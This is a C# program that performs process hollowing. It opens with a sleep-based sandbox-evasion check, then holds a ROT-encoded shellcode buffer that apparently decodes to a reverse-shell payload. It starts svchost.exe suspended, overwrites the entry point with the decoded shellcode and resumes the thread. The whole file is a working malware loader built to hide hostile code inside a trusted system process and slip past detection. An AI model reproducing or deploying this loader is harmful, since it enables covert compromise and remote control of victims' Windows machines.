using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ProcessHollow
{
    class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            byte[] buf = new byte[650] { 0x21, 0x6d, 0xa8, 0x09, 0x15, 0x0d, 0xf1, 0x25, 0x25, 0x25, 0x66, 0x76, 0x66, 0x75, 0x77, 0x76, 0x6d, 0x56, 0xf7, 0x8a, 0x6d, 0xb0, 0x77, 0x85, 0x7b, 0x6d, 0xb0, 0x77, 0x3d, 0x6d, 0xb0, 0x77, 0x45, 0x72, 0x56, 0xee, 0x6d, 0x34, 0xdc, 0x6f, 0x6f, 0x6d, 0xb0, 0x97, 0x75, 0x6d, 0x56, 0xe5, 0xd1, 0x61, 0x86, 0xa1, 0x27, 0x51, 0x45, 0x66, 0xe6, 0xee, 0x32, 0x66, 0x26, 0xe6, 0x07, 0x12, 0x77, 0x6d, 0xb0, 0x77, 0x45, 0x66, 0x76, 0xb0, 0x67, 0x61, 0x6d, 0x26, 0xf5, 0x8b, 0xa6, 0x9d, 0x3d, 0x30, 0x27, 0x34, 0xaa, 0x97, 0x25, 0x25, 0x25, 0xb0, 0xa5, 0xad, 0x25, 0x25, 0x25, 0x6d, 0xaa, 0xe5, 0x99, 0x8c, 0x6d, 0x26, 0xf5, 0xb0, 0x6d, 0x3d, 0x75, 0x69, 0xb0, 0x65, 0x45, 0x6e, 0x26, 0xf5, 0x08, 0x7b, 0x6d, 0x24, 0xee, 0x66, 0xb0, 0x59, 0xad, 0x6d, 0x26, 0xfb, 0x72, 0x56, 0xee, 0x6d, 0x56, 0xe5, 0xd1, 0x66, 0xe6, 0xee, 0x32, 0x66, 0x26, 0xe6, 0x5d, 0x05, 0x9a, 0x16, 0x71, 0x28, 0x71, 0x49, 0x2d, 0x6a, 0x5e, 0xf6, 0x9a, 0xfd, 0x7d, 0x69, 0xb0, 0x65, 0x49, 0x6e, 0x26, 0xf5, 0x8b, 0x66, 0xb0, 0x31, 0x6d, 0x69, 0xb0, 0x65, 0x41, 0x6e, 0x26, 0xf5, 0x66, 0xb0, 0x29, 0xad, 0x66, 0x7d, 0x66, 0x7d, 0x6d, 0x26, 0xf5, 0x83, 0x7e, 0x7f, 0x66, 0x7d, 0x66, 0x7e, 0x66, 0x7f, 0x6d, 0xa8, 0x11, 0x45, 0x66, 0x77, 0x24, 0x05, 0x7d, 0x66, 0x7e, 0x7f, 0x6d, 0xb0, 0x37, 0x0e, 0x70, 0x24, 0x24, 0x24, 0x82, 0x6d, 0x56, 0x00, 0x78, 0x6e, 0xe3, 0x9c, 0x8e, 0x93, 0x8e, 0x93, 0x8a, 0x99, 0x25, 0x66, 0x7b, 0x6d, 0xae, 0x06, 0x6e, 0xec, 0xe7, 0x71, 0x9c, 0x4b, 0x2c, 0x24, 0xfa, 0x78, 0x78, 0x6d, 0xae, 0x06, 0x78, 0x7f, 0x72, 0x56, 0xe5, 0x72, 0x56, 0xee, 0x78, 0x78, 0x6e, 0xdf, 0x5f, 0x7b, 0x9e, 0xcc, 0x25, 0x25, 0x25, 0x25, 0x24, 0xfa, 0x0d, 0x34, 0x25, 0x25, 0x25, 0x56, 0x5e, 0x57, 0x53, 0x56, 0x5b, 0x5d, 0x53, 0x59, 0x5e, 0x53, 0x56, 0x5b, 0x5d, 0x25, 0x7f, 0x6d, 0xae, 0xe6, 0x6e, 0xec, 0xe5, 0xe0, 0x26, 0x25, 0x25, 0x72, 0x56, 0xee, 0x78, 0x78, 0x8f, 0x28, 0x78, 0x6e, 0xdf, 0x7c, 0xae, 0xc4, 0xeb, 0x25, 0x25, 0x25, 0x25, 0x24, 0xfa, 0x0d, 0x85, 0x25, 0x25, 0x25, 0x54, 0x9f, 0x8f, 0x6a, 0x6f, 0x68, 0x72, 0x7d, 0x7f, 0x59, 0x69, 0x91, 0x8d, 0x52, 0x6c, 0x69, 0x5b, 0x66, 0x5e, 0x93, 0x9b, 0x59, 0x9c, 0x90, 0x6b, 0x70, 0x58, 0x7e, 0x7e, 0x84, 0x90, 0x72, 0x69, 0x56, 0x9d, 0x5b, 0x6d, 0x7e, 0x75, 0x97, 0x9b, 0x5b, 0x56, 0x6e, 0x86, 0x87, 0x8e, 0x57, 0x72, 0x84, 0x95, 0x9c, 0x71, 0x6a, 0x73, 0x5c, 0x6a, 0x8a, 0x88, 0x9c, 0x58, 0x9f, 0x89, 0x7b, 0x72, 0x9a, 0x9c, 0x93, 0x88, 0x6e, 0x9e, 0x84, 0x90, 0x75, 0x5a, 0x58, 0x5a, 0x86, 0x8d, 0x94, 0x96, 0x55, 0x5a, 0x66, 0x8b, 0x93, 0x6e, 0x9b, 0x8c, 0x8f, 0x58, 0x78, 0x98, 0x75, 0x74, 0x25, 0x6d, 0xae, 0xe6, 0x78, 0x7f, 0x66, 0x7d, 0x72, 0x56, 0xee, 0x78, 0x6d, 0xdd, 0x25, 0x57, 0xcd, 0xa9, 0x25, 0x25, 0x25, 0x25, 0x75, 0x78, 0x78, 0x6e, 0xec, 0xe7, 0x10, 0x7a, 0x53, 0x60, 0x24, 0xfa, 0x6d, 0xae, 0xeb, 0x8f, 0x2f, 0x84, 0x6d, 0xae, 0x16, 0x8f, 0x44, 0x7f, 0x77, 0x8d, 0xa5, 0x58, 0x25, 0x25, 0x6e, 0xae, 0x05, 0x8f, 0x29, 0x66, 0x7e, 0x6e, 0xdf, 0x9a, 0x6b, 0xc3, 0xab, 0x25, 0x25, 0x25, 0x25, 0x24, 0xfa, 0x72, 0x56, 0xe5, 0x78, 0x7f, 0x6d, 0xae, 0x16, 0x72, 0x56, 0xee, 0x72, 0x56, 0xee, 0x78, 0x78, 0x6e, 0xec, 0xe7, 0x52, 0x2b, 0x3d, 0xa0, 0x24, 0xfa, 0xaa, 0xe5, 0x9a, 0x44, 0x6d, 0xec, 0xe6, 0xad, 0x38, 0x25, 0x25, 0x6e, 0xdf, 0x69, 0x15, 0x5a, 0x05, 0x25, 0x25, 0x25, 0x25, 0x24, 0xfa, 0x6d, 0x24, 0xf4, 0x99, 0x27, 0x10, 0xcf, 0x0d, 0x7a, 0x25, 0x25, 0x25, 0x78, 0x7e, 0x8f, 0x65, 0x7f, 0x6e, 0xae, 0xf6, 0xe6, 0x07, 0x35, 0x6e, 0xec, 0xe5, 0x25, 0x35, 0x25, 0x25, 0x6e, 0xdf, 0x7d, 0xc9, 0x78, 0x0a, 0x25, 0x25, 0x25, 0x25, 0x24, 0xfa, 0x6d, 0xb8, 0x78, 0x78, 0x6d, 0xae, 0x0c, 0x6d, 0xae, 0x16, 0x6d, 0xae, 0xff, 0x6e, 0xec, 0xe5, 0x25, 0x45, 0x25, 0x25, 0x6e, 0xae, 0x1e, 0x6e, 0xdf, 0x37, 0xbb, 0xae, 0x07, 0x25, 0x25, 0x25, 0x25, 0x24, 0xfa, 0x6d, 0xa8, 0xe9, 0x45, 0xaa, 0xe5, 0x99, 0xd7, 0x8b, 0xb0, 0x2c, 0x6d, 0x26, 0xe8, 0xaa, 0xe5, 0x9a, 0xf7, 0x7d, 0xe8, 0x7d, 0x8f, 0x25, 0x7e, 0x6e, 0xec, 0xe7, 0x15, 0xda, 0xc7, 0x7b, 0x24, 0xfa };

            StartupInfo si = new StartupInfo();
            ProcessInfo pi = new ProcessInfo();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            ProcessBasicInfo bi = new ProcessBasicInfo();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            //// Decode the ROTxx payload (make sure to change rotations)
            for (int i = 0; i < buf.Length; i++)
           {
                buf[i] = (byte)(((uint)buf[i] - 37) & 0xFF);
           }

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}
